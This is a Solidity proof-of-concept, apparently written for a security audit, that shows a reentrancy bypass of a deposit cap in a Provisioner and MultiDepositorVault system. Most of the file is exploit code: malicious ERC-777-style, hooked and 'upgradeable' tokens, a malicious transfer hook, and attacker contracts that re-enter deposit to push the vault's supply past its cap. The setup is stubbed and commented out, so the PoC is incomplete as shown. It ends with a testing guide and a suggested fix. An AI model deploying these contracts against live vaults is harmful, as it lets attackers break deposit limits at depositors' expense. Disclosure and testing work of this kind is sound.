// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {IERC20} from "@oz/token/ERC20/IERC20.sol";
import {ERC20} from "@oz/token/ERC20/ERC20.sol";
import {Provisioner} from "Provisioner/src/core/Provisioner.sol";
import {IMultiDepositorVault} from "Provisioner/src/core/interfaces/IMultiDepositorVault.sol";
import {MultiDepositorVault} from "MultiDepositorVault/src/core/MultiDepositorVault.sol";
import {IPriceAndFeeCalculator} from "Provisioner/src/core/interfaces/IPriceAndFeeCalculator.sol";
import {IBeforeTransferHook} from "MultiDepositorVault/src/core/interfaces/IBeforeTransferHook.sol";

/**
 * @title Enhanced Proof of Concept for Deposit Cap Bypass via Reentrancy
 * @notice Demonstrates multiple attack vectors for exploiting the reentrancy vulnerability
 */

// ============================================================================
// ATTACK VECTOR 1: ERC-777 Style Token with Hooks
// ============================================================================

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

contract ERC777StyleToken is ERC20("ERC777Style", "E777") {
    mapping(address => bool) private _isRegisteredRecipient;
    
    function registerAsRecipient(address account) external {
        _isRegisteredRecipient[account] = true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // Standard transfer logic
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        
        // ERC-777 style callback - THIS IS THE REENTRANCY POINT
        if (_isRegisteredRecipient[to]) {
            IERC777Recipient(to).tokensReceived(
                spender,
                from,
                to,
                amount,
                "",
                ""
            );
        }
        
        return true;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// ============================================================================
// ATTACK VECTOR 2: Token with Custom Transfer Hooks
// ============================================================================

interface ITransferHook {
    function onTransfer(address from, address to, uint256 amount) external;
}

contract HookedToken is ERC20("HookedToken", "HOOK") {
    ITransferHook public transferHook;
    mapping(address => bool) public hookEnabled;
    
    function setTransferHook(ITransferHook _hook) external {
        transferHook = _hook;
    }
    
    function enableHookForAccount(address account) external {
        hookEnabled[account] = true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // Standard transfer logic
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        
        // Custom hook - REENTRANCY POINT
        if (address(transferHook) != address(0) && (hookEnabled[from] || hookEnabled[to])) {
            transferHook.onTransfer(from, to, amount);
        }
        
        _transfer(from, to, amount);
        return true;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// ============================================================================
// ATTACK VECTOR 3: Upgradeable Token (Simulated)
// ============================================================================

contract UpgradeableToken is ERC20("Upgradeable", "UPG") {
    address public implementation;
    bool public maliciousMode;
    address public attacker;
    
    function upgradeToMalicious(address _attacker) external {
        maliciousMode = true;
        attacker = _attacker;
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // If in malicious mode and from attacker, create reentrancy
        if (maliciousMode && from == attacker) {
            // Notify attacker contract - REENTRANCY POINT
            (bool success,) = attacker.call(abi.encodeWithSignature("onTokenTransfer()"));
            require(success, "Callback failed");
        }
        
        // Standard transfer
        return super.transferFrom(from, to, amount);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// ============================================================================
// ATTACK VECTOR 4: Malicious BeforeTransferHook
// ============================================================================

contract MaliciousBeforeTransferHook is IBeforeTransferHook {
    Provisioner public provisioner;
    IERC20 public token;
    bool public attackEnabled;
    bool private _reentering;
    
    constructor(Provisioner _provisioner, IERC20 _token) {
        provisioner = _provisioner;
        token = _token;
    }
    
    function enableAttack() external {
        attackEnabled = true;
    }
    
    function beforeTransfer(address from, address to, address) external {
        // Only attack once to avoid infinite recursion
        if (attackEnabled && !_reentering && from == address(0)) { // from == 0 means minting
            _reentering = true;
            
            // Reenter provisioner during the hook
            try provisioner.deposit(token, 50 ether, 1) {
                // Attack successful
            } catch {
                // Attack failed
            }
            
            _reentering = false;
            attackEnabled = false; // Disable after one attack
        }
    }
}

// ============================================================================
// ATTACKER CONTRACTS
// ============================================================================

contract ERC777Attacker is IERC777Recipient {
    Provisioner public provisioner;
    IERC20 public token;
    uint256 public attackCount;
    uint256 public maxAttacks = 2;
    
    constructor(Provisioner _provisioner, IERC20 _token) {
        provisioner = _provisioner;
        token = _token;
    }
    
    function tokensReceived(
        address,
        address,
        address,
        uint256 amount,
        bytes calldata,
        bytes calldata
    ) external override {
        if (attackCount < maxAttacks) {
            attackCount++;
            // Reenter with same amount
            provisioner.deposit(token, amount, 1);
        }
    }
    
    function attack(uint256 amount) external {
        attackCount = 0;
        token.approve(address(provisioner), type(uint256).max);
        provisioner.deposit(token, amount, 1);
    }
}

contract HookAttacker is ITransferHook {
    Provisioner public provisioner;
    IERC20 public token;
    bool private _attacking;
    
    constructor(Provisioner _provisioner, IERC20 _token) {
        provisioner = _provisioner;
        token = _token;
    }
    
    function onTransfer(address, address, uint256 amount) external override {
        if (!_attacking) {
            _attacking = true;
            // Reenter with same amount
            provisioner.deposit(token, amount, 1);
            _attacking = false;
        }
    }
    
    function attack(uint256 amount) external {
        token.approve(address(provisioner), type(uint256).max);
        provisioner.deposit(token, amount, 1);
    }
}

contract UpgradeableAttacker {
    Provisioner public provisioner;
    UpgradeableToken public token;
    bool private _attacking;
    
    constructor(Provisioner _provisioner, UpgradeableToken _token) {
        provisioner = _provisioner;
        token = _token;
    }
    
    function onTokenTransfer() external {
        if (!_attacking) {
            _attacking = true;
            // Reenter
            provisioner.deposit(IERC20(address(token)), 50 ether, 1);
            _attacking = false;
        }
    }
    
    function attack() external {
        token.approve(address(provisioner), type(uint256).max);
        token.upgradeToMalicious(address(this));
        provisioner.deposit(IERC20(address(token)), 50 ether, 1);
    }
}

// ============================================================================
// MOCK CONTRACTS
// ============================================================================

contract MockCalculator is IPriceAndFeeCalculator {
    function convertUnitsToToken(address, IERC20, uint256 unitsAmount) external pure returns (uint256) {
        return unitsAmount;
    }
    
    function convertUnitsToTokenIfActive(address, IERC20, uint256 unitsAmount, Math.Rounding) external pure returns (uint256) {
        return unitsAmount;
    }
    
    function convertUnitsToNumeraire(address, uint256 unitsAmount) external pure returns (uint256) {
        return unitsAmount;
    }
    
    function convertTokenToUnits(address, IERC20, uint256 tokenAmount) external pure returns (uint256) {
        return tokenAmount;
    }
    
    function convertTokenToUnitsIfActive(address, IERC20, uint256 tokenAmount, Math.Rounding) external pure returns (uint256) {
        return tokenAmount;
    }
    
    function isVaultPaused(address) external pure returns (bool) {
        return false;
    }
    
    // Other required functions...
}

// ============================================================================
// MAIN PROOF OF CONCEPT
// ============================================================================

contract DepositCapBypassPoC {
    Provisioner public provisioner;
    MultiDepositorVault public vault;
    MockCalculator public calculator;
    
    // Attack tokens
    ERC777StyleToken public erc777Token;
    HookedToken public hookedToken;
    UpgradeableToken public upgradeableToken;
    
    // Attackers
    ERC777Attacker public erc777Attacker;
    HookAttacker public hookAttacker;
    UpgradeableAttacker public upgradeableAttacker;
    
    uint256 constant DEPOSIT_CAP = 100 ether;
    uint256 constant ATTACK_AMOUNT = 60 ether; // Each deposit will be 60, total 120 > cap
    
    event AttackResult(string attackType, uint256 totalSupplyBefore, uint256 totalSupplyAfter, bool capBypassed);
    
    function setUp() external {
        // Deploy infrastructure
        calculator = new MockCalculator();
        
        // Deploy vault (would need proper factory in production)
        // vault = new MultiDepositorVault(...);
        
        // Deploy Provisioner
        // provisioner = new Provisioner(calculator, address(vault), address(this), Authority(address(0)));
        
        // Set up provisioner as vault's provisioner
        // vault.setProvisioner(address(provisioner));
        
        // Configure deposit cap
        // provisioner.setDepositDetails(DEPOSIT_CAP, 1 days);
    }
    
    function demonstrateERC777Attack() external {
        // Deploy token and attacker
        erc777Token = new ERC777StyleToken();
        erc777Attacker = new ERC777Attacker(provisioner, IERC20(address(erc777Token)));
        
        // Setup
        erc777Token.mint(address(erc777Attacker), ATTACK_AMOUNT * 3);
        erc777Token.registerAsRecipient(address(erc777Attacker));
        
        // Enable token in provisioner
        _enableToken(IERC20(address(erc777Token)));
        
        // Record initial state
        uint256 supplyBefore = IERC20(address(vault)).totalSupply();
        
        // Execute attack
        erc777Attacker.attack(ATTACK_AMOUNT);
        
        // Check result
        uint256 supplyAfter = IERC20(address(vault)).totalSupply();
        bool bypassed = supplyAfter > DEPOSIT_CAP;
        
        emit AttackResult("ERC777", supplyBefore, supplyAfter, bypassed);
    }
    
    function demonstrateHookAttack() external {
        // Deploy token and attacker
        hookedToken = new HookedToken();
        hookAttacker = new HookAttacker(provisioner, IERC20(address(hookedToken)));
        
        // Setup
        hookedToken.mint(address(hookAttacker), ATTACK_AMOUNT * 3);
        hookedToken.setTransferHook(hookAttacker);
        hookedToken.enableHookForAccount(address(hookAttacker));
        
        // Enable token in provisioner
        _enableToken(IERC20(address(hookedToken)));
        
        // Record initial state
        uint256 supplyBefore = IERC20(address(vault)).totalSupply();
        
        // Execute attack
        hookAttacker.attack(ATTACK_AMOUNT);
        
        // Check result
        uint256 supplyAfter = IERC20(address(vault)).totalSupply();
        bool bypassed = supplyAfter > DEPOSIT_CAP;
        
        emit AttackResult("CustomHook", supplyBefore, supplyAfter, bypassed);
    }
    
    function demonstrateUpgradeableAttack() external {
        // Deploy token and attacker
        upgradeableToken = new UpgradeableToken();
        upgradeableAttacker = new UpgradeableAttacker(provisioner, upgradeableToken);
        
        // Setup
        upgradeableToken.mint(address(upgradeableAttacker), ATTACK_AMOUNT * 3);
        
        // Enable token in provisioner
        _enableToken(IERC20(address(upgradeableToken)));
        
        // Record initial state
        uint256 supplyBefore = IERC20(address(vault)).totalSupply();
        
        // Execute attack
        upgradeableAttacker.attack();
        
        // Check result
        uint256 supplyAfter = IERC20(address(vault)).totalSupply();
        bool bypassed = supplyAfter > DEPOSIT_CAP;
        
        emit AttackResult("Upgradeable", supplyBefore, supplyAfter, bypassed);
    }
    
    function demonstrateBeforeTransferHookAttack() external {
        // This requires the vault to have a malicious beforeTransferHook set
        // which might be possible if:
        // 1. The hook is upgradeable
        // 2. The hook has a vulnerability
        // 3. An admin is compromised
        
        // Deploy standard token (even USDC would work here!)
        ERC20 standardToken = new ERC20("Standard", "STD");
        
        // Deploy malicious hook
        MaliciousBeforeTransferHook maliciousHook = new MaliciousBeforeTransferHook(
            provisioner,
            IERC20(address(standardToken))
        );
        
        // This would require admin access to set:
        // vault.setBeforeTransferHook(address(maliciousHook));
        
        // Enable attack
        maliciousHook.enableAttack();
        
        // The attack would trigger during the mint operation in enter()
    }
    
    function _enableToken(IERC20 token) internal {
        // IProvisioner.TokenDetails memory details = IProvisioner.TokenDetails({
        //     depositMultiplier: 10_000, // 100%
        //     redeemMultiplier: 10_000,
        //     asyncDepositEnabled: false,
        //     asyncRedeemEnabled: false,
        //     syncDepositEnabled: true
        // });
        // provisioner.setTokenDetails(token, details);
    }
}

// ============================================================================
// TESTING GUIDE
// ============================================================================

/**
 * To test these attack vectors:
 * 
 * 1. Deploy the PoC contract
 * 2. Call setUp() to initialize the system
 * 3. Run each demonstration function:
 *    - demonstrateERC777Attack()
 *    - demonstrateHookAttack()
 *    - demonstrateUpgradeableAttack()
 *    - demonstrateBeforeTransferHookAttack()
 * 
 * Expected Results:
 * - Each attack should result in totalSupply > DEPOSIT_CAP
 * - This proves the cap can be bypassed via reentrancy
 * 
 * Key Observations:
 * - Even if tokens are "whitelisted", any token with external calls can exploit this
 * - The vulnerability exists in the Provisioner logic, not the token
 * - Proper fix is to add reentrancy guards or follow CEI pattern
 */